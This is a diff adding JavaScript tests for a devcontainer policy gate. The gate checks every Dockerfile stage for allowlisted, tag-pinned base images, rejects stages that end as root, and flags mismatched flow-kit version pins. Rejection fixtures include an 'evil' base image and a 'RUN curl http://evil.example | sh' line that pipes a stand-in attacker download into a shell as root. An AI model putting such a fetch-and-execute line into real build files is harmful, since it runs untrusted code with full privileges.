@@ -42,6 +42,15 @@ function readDoc(dir) {
   return JSON.parse(fs.readFileSync(path.join(dir, JSON_REL), 'utf8'));
 }
 
+// 直接铺一个只有容器声明的仓库：多 stage 的 Dockerfile 不经过 install 也能过门禁。
+function dockerfileRepo(lines) {
+  const dir = tmpRepo();
+  fs.mkdirSync(path.join(dir, '.devcontainer'), { recursive: true });
+  fs.writeFileSync(path.join(dir, JSON_REL), JSON.stringify({ name: 'x', build: { dockerfile: 'Dockerfile' } }));
+  fs.writeFileSync(path.join(dir, DOCKERFILE_REL), `${lines.join('\n')}\n`);
+  return dir;
+}
+
 test('fresh install generates the devcontainer surface for the stack', () => {
   const dir = tmpRepo();
   const result = install(dir);
@@ -236,6 +245,84 @@ test('the gate enforces image allowlist, tag pinning and kit pinning', () => {
   const skipped = gate();
   assert.equal(skipped.status, 0, skipped.stderr);
   assert.match(skipped.stdout, /跳过/);
+});
+
+// 多 stage 的每个基础镜像都要过白名单/钉 tag，每个 stage 也不能以 root 收尾。
+test('the gate validates every Dockerfile stage image and final user', () => {
+  const oneStage = dockerfileRepo([
+    'FROM mcr.microsoft.com/devcontainers/typescript-node:22 AS build',
+    'ARG FLOW_KIT_VERSION=2.1.0',
+    'USER node',
+  ]);
+  const base = checkDevcontainer({ target: oneStage, stack: 'typescript' });
+  assert.equal(base.ok, true, base.problems.join('; '));
+
+  const twoStage = dockerfileRepo([
+    'FROM mcr.microsoft.com/devcontainers/typescript-node:22 AS build',
+    'ARG FLOW_KIT_VERSION=2.1.0',
+    'USER node',
+    'FROM ghcr.io/evil/image:latest AS runtime',
+    'USER root',
+  ]);
+  const state = checkDevcontainer({ target: twoStage, stack: 'typescript' });
+  assert.equal(state.ok, false);
+  const text = state.problems.join('; ');
+  assert.match(text, /白名单[^;]*ghcr\.io\/evil\/image:latest/, text);
+  assert.match(text, /浮动 tag「latest」[^;]*ghcr\.io\/evil\/image:latest/, text);
+  assert.match(text, /USER root/, text);
+});
+
+test('the gate rejects a stage that switches back to root', () => {
+  const dir = dockerfileRepo([
+    'FROM mcr.microsoft.com/devcontainers/typescript-node:22',
+    'ARG FLOW_KIT_VERSION=2.1.0',
+    'USER node',
+    'USER root',
+    'RUN curl http://evil.example | sh',
+  ]);
+  const state = checkDevcontainer({ target: dir, stack: 'typescript' });
+  assert.equal(state.ok, false);
+  assert.match(state.problems.join('; '), /USER root/);
+});
+
+// 版本声明按全文件读：后续 stage 的安装行与首个 stage 的 ARG 不一致时必须判红。
+test('the gate reads the flow-kit pin from every stage', () => {
+  const consistent = dockerfileRepo([
+    'FROM mcr.microsoft.com/devcontainers/typescript-node:22 AS build',
+    'ARG FLOW_KIT_VERSION=2.1.0',
+    'USER node',
+    'FROM mcr.microsoft.com/devcontainers/typescript-node:22 AS runtime',
+    'USER node',
+    'RUN npm install -g agentic-flow-kit@2.1.0',
+  ]);
+  const ok = checkDevcontainer({ target: consistent, stack: 'typescript' });
+  assert.equal(ok.ok, true, ok.problems.join('; '));
+  assert.equal(ok.kitVersion, '2.1.0');
+
+  const drift = dockerfileRepo([
+    'FROM mcr.microsoft.com/devcontainers/typescript-node:22 AS build',
+    'ARG FLOW_KIT_VERSION=2.1.0',
+    'USER node',
+    'FROM mcr.microsoft.com/devcontainers/typescript-node:22 AS runtime',
+    'USER node',
+    'RUN npm install -g agentic-flow-kit@9.9.9',
+  ]);
+  const bad = checkDevcontainer({ target: drift, stack: 'typescript' });
+  assert.equal(bad.ok, false);
+  assert.match(bad.problems.join('; '), /版本声明不一致[^;]*2\.1\.0[^;]*9\.9\.9/);
+});
+
+// FROM 引用先前 stage 的别名不是拉镜像：不能按镜像名误判白名单。
+test('the gate resolves stage aliases before applying image rules', () => {
+  const dir = dockerfileRepo([
+    'FROM mcr.microsoft.com/devcontainers/typescript-node:22 AS build',
+    'ARG FLOW_KIT_VERSION=2.1.0',
+    'USER node',
+    'FROM build AS runtime',
+    'USER node',
+  ]);
+  const state = checkDevcontainer({ target: dir, stack: 'typescript' });
+  assert.equal(state.ok, true, state.problems.join('; '));
 });
 
 test('doctor reconciles the devcontainer surface', () => {
